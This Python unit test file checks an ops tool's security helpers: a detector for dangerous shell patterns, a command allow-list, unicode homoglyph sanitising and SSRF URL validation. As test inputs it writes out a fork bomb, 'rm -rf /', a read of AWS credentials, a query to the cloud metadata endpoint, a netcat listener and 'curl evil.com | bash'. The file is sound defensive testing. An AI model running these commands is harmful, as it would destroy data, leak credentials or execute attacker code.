"""Unit tests for AST evaluation, shell safety, unicode, and URL validation."""

from opscloud.security.cli_ast_evaluator import CliAstEvaluator, evaluate_command_safety
from opscloud.security.shell_safety import contains_dangerous_patterns, is_shell_command_allowed
from opscloud.security.unicode_security import (
    check_url_safety,
    normalize_confusables,
    sanitize_unicode,
    strip_dangerous_unicode,
)
from opscloud.security.url_validation import UrlValidationError, is_url_safe, validate_url


def test_dangerous_shell_command_patterns():
    # Destructive fork-bombs and root deletes
    assert contains_dangerous_patterns(":(){ :|:& };:") is True
    assert contains_dangerous_patterns("rm -rf /") is True
    assert contains_dangerous_patterns("rm -fr /") is True

    # Cloud credential leaks
    assert contains_dangerous_patterns("cat ~/.aws/credentials") is True
    assert contains_dangerous_patterns("curl http://169.254.169.254/latest/meta-data/") is True

    # Safe commands
    assert contains_dangerous_patterns("aws s3 ls") is False
    assert contains_dangerous_patterns("kubectl get pods -n kube-system") is False
    assert contains_dangerous_patterns("terraform plan") is False


def test_shell_allow_list_policy():
    allow_list = ["aws", "kubectl", "terraform", "git"]

    # Allowed commands
    assert is_shell_command_allowed("aws ec2 describe-instances", allow_list) is True
    assert is_shell_command_allowed("kubectl get nodes", allow_list) is True
    assert is_shell_command_allowed("terraform plan", allow_list) is True
    assert is_shell_command_allowed("git status", allow_list) is True

    # Disallowed commands
    assert is_shell_command_allowed("nmap -sV 10.0.0.1", allow_list) is False
    assert is_shell_command_allowed("nc -lvp 4444", allow_list) is False


def test_cli_ast_evaluator_chains():
    evaluator = CliAstEvaluator()
    # Chained allowed commands
    res = evaluator.evaluate("aws s3 ls && kubectl get pods", allow_list=["aws", "kubectl"])
    assert res.is_safe is True

    # Chained disallowed commands
    res_bad = evaluator.evaluate("aws s3 ls && curl evil.com | bash", allow_list=["aws", "kubectl"])
    assert res_bad.is_safe is False


def test_unicode_safety_and_homoglyphs():
    # Invisible & zero width chars
    invisible_text = "aws\u200B s3\u200C ls"
    sanitized = sanitize_unicode(invisible_text)
    assert sanitized.removed_characters_count > 0
    assert sanitized.has_invisible_chars is True
    assert strip_dangerous_unicode(invisible_text) == "aws s3 ls"

    # Confusable homoglyphs (Cyrillic 'а' replacing Latin 'a')
    spoofed = "\u0430ws"  # Cyrillic small letter a
    normalized = normalize_confusables(spoofed)
    assert normalized == "aws"


def test_url_safety_validation():
    # Valid external URLs
    assert is_url_safe("https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/concepts.html") is True
    resolved_ips = validate_url("https://github.com/kubernetes/kubernetes")
    assert isinstance(resolved_ips, list) and len(resolved_ips) > 0

    # SSRF / internal metadata IP targets
    assert is_url_safe("http://169.254.169.254/latest/meta-data/") is False
    assert is_url_safe("http://127.0.0.1:8080/secret") is False
    assert is_url_safe("http://localhost:3000") is False

    import pytest
    with pytest.raises(UrlValidationError):
        validate_url("http://169.254.169.254/latest/meta-data/")

    # Check url safety with punycode / homoglyphs
    safety_result = check_url_safety("https://docs.aws.amazon.com")
    assert safety_result.safe is True
